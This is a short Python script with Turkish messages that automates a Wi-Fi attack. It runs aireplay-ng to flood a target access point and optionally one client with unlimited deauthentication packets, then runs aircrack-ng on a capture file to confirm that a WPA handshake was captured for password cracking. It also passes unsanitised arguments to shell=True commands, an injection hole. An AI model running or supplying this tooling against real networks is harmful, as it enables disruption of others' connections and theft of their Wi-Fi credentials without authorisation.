import subprocess

def pulse_kick(iface, bssid, client=None, timer=0):
    print(f"\n    [*] Vuruş başlatılıyor... (Süre: {'Sınırsız' if timer==0 else str(timer)+' sn'})")
    # 0 parametresi sınırsız paket yollar (Durdurana kadar)
    cmd = f"sudo aireplay-ng -0 0 -a {bssid}"
    if client: cmd += f" -c {client}"
    cmd += f" {iface}"
    
    try:
        if timer > 0:
            subprocess.run(cmd, shell=True, timeout=timer)
            print(f"\n    [✔] Süre doldu. Vuruş durduruldu.")
        else:
            subprocess.run(cmd, shell=True)
    except subprocess.TimeoutExpired:
        print(f"\n    [✔] Süre doldu. Vuruş durduruldu.")
    except KeyboardInterrupt:
        print(f"\n    [!] Vuruş manuel iptal edildi.")

def verify_handshake(cap_file):
    print(f"\n    [*] {cap_file} analizi yapılıyor...")
    cmd = f"sudo aircrack-ng {cap_file}"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if "1 handshake" in res.stdout or "WPA (1 handshake" in res.stdout:
        print(f"    [✔] MÜKEMMEL! Geçerli bir Handshake yakalandı.")
        return True
    else:
        print(f"    [✘] Handshake bulunamadı. Hedefi daha sert düşürmen lazım.")
        return False